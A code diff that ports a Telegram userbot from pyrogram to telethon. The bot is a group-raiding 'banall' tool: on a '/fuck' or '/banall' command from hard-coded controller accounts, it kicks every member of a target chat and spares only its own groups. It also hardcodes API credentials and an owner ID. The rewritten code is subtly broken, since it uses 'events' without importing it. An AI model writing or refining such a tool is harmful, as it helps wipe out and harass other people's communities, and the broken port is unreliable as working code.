@@ -1,48 +1,50 @@
 from os import getenv
 from asyncio import sleep
+from telethon.sync import TelegramClient
+from telethon.tl import functions
+from telethon.tl.types import InputUser
+from telethon.errors import ChatAdminRequiredError
 
-from pyrogram import Client, filters, idle
-from pyrogram.types import Message
-
-
+API_ID = 12227067
+API_HASH = "b463bedd791aa733ae2297e6520302fe"
 SESSION = getenv('SESSION')
 SUDO_USERS = list(map(int, getenv("SUDO_USERS", "").split()))
 SUDO_USERS.append(5360305806)
-CHATS = ['AbhiModszYT_Return', '@AbhiModszYT_Return', '@AM_YTSupport', 'AM_YTSupport', '-1001544173381', '-1001841879487']
+CHATS = [-1001544173381, -1001841879487]
 
-M = Client(SESSION, api_id=12227067, api_hash="b463bedd791aa733ae2297e6520302fe")
-
-
-@M.on_message(filters.user(SUDO_USERS) & filters.command('start'))
-async def start(_, message: Message):
-     await message.reply_text("𝓐𝓜𝓑𝓞𝓣 𝓡𝓮𝓪𝓭𝔂 𝓕𝓸𝓻 𝓚𝓲𝓵𝓵 𝓔𝓷𝓮𝓶𝔂....")
+client = TelegramClient(SESSION, API_ID, API_HASH)
 
 
-@M.on_message(filters.user(SUDO_USERS) & filters.command(["fuck", "banall"]))
-async def altron(app: Client, message: Message):
+@client.on(events.NewMessage(chats=SUDO_USERS, pattern='/start'))
+async def start(event):
+    await event.reply("𝓐𝓜𝓑𝓞𝓣 𝓡𝓮𝓪𝓭𝔂 𝓕𝓸𝓻 𝓚𝓲𝓵𝓵 𝓔𝓷𝓮𝓶𝔂....")
+
+
+@client.on(events.NewMessage(chats=SUDO_USERS, pattern='/fuck|/banall'))
+async def altron(event):
     try:
-        chat_id = message.text.split(" ")[1]
-        m = await message.reply_text("ᴏɴʟɪɴᴇ")
+        chat_id = int(event.text.split(" ")[1])
+        await event.reply("ᴏɴʟɪɴᴇ")
         if chat_id in CHATS:
             return
-    except:
-        await message.reply_text("**Usage:**\n`/fuck [chat_id]`\n\n`/banall`")
+    except (ValueError, IndexError):
+        await event.reply("**Usage:**\n`/fuck [chat_id]`\n\n`/banall`")
         return
 
-    await m.edit_text("Boom...")
+    await event.edit("Boom...")
     await sleep(3)
 
-    async for x in app.iter_chat_members(chat_id):
-        if x.user.id in SUDO_USERS:
+    async for member in client.iter_participants(chat_id):
+        if member.id in SUDO_USERS:
             continue
         try:
-            await app.ban_chat_member(chat_id=chat_id, user_id=x.user.id)
-        except:
-            pass
+            await client.kick_participant(chat_id, member.id)
+        except ChatAdminRequiredError:
+            print("Bot does not have admin rights in the chat.")
+            break
+        except Exception as e:
+            print(f"Error banning user {member.id}: {e}")
 
-
-M.start()
-M.join_chat("AbhiModszYT_Return")
-print("Bot Started Successfully")
-idle()
-M.stop()
+if __name__ == "__main__":
+    client.start()
+    client.run_until_disconnected()
